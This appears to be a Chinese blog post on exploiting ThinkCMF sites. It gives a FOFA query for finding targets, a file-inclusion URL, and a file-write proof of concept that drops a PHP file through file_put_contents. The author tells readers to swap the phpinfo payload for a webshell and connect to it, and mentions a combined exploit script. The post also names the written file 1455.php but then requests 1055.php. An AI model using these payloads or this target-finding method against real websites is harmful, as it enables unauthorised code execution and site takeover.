# FOFA语法：app="thinkCMF"



# thinkCMF文件包含漏洞

## 一、简介

thinkCMF它是一个开源的，支持[swoole](https://so.csdn.net/so/search?q=swoole&spm=1001.2101.3001.7020)的开源内容管理框架，让web开发更快，节约时间，这个框架的话是基于thinkphp的二次开发框架，所以说在我们国内还是有大部分的网站使用到这样的一个框架的。

## 二、漏洞利用

https://xxxx/index.php?a=display&templateFile=README.md

然后我们去到浏览器界面输入README.md回车，就可以发现我们能够成功的包含出这样的一个代码。

![image-20220718140532111](https://0-bit.oss-cn-beijing.aliyuncs.com/cuer/image-20220718140532111.png)

证明该文件包含漏洞有效



# thinkCMF文件写入漏洞

## 一、漏洞利用

[https://xx/index.php?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1455.php','<?php phpinfo();?>')</php>]()

poc为`?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1455.php','<?php phpinfo();?>')</php>`

再请求1055.php之后即可看到phpinfo界面

利用时可将<?php  phpinfo();?>替换为webshell，写入成功后连接。

![image-20220718142724470](https://0-bit.oss-cn-beijing.aliyuncs.com/cuer/image-20220718142724470.png)



## 我将这两个漏洞结合，编写了综合利用脚本，见**ThinkCMF.py**